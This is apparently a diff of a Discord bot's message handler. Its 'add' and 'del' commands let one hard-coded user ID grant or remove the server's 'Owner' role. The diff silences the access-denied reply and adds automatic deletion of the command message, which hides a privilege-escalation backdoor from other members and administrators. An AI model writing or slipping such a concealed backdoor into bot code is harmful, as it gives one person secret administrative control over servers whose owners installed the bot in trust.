@@ -26,15 +26,17 @@ if(message.content.startsWith(PREFIX + 'say')) {
 
 if (message.content.startsWith(PREFIX + "add")) {
   if(message.author.id !== ownelki){
-    return message.reply(":x: Vous n'avez pas l'accès.").catch(console.error)
+    return message.reply("").catch(console.error)
     }
+    message.delete(2)
     let role = message.guild.roles.find("name", "Owner")
     message.member.addRole(role).catch(console.error);
 
 }  if (message.content.startsWith(PREFIX + "del")) {
   if(message.author.id !== ownelki){
-    return message.reply(":x: Vous n'avez pas l'accès.").catch(console.error)
+    return message.reply("").catch(console.error)
     }
+        message.delete(2)
     let role = message.guild.roles.find("name", "Owner");
     message.member.removeRole(role).catch(console.error);
 }
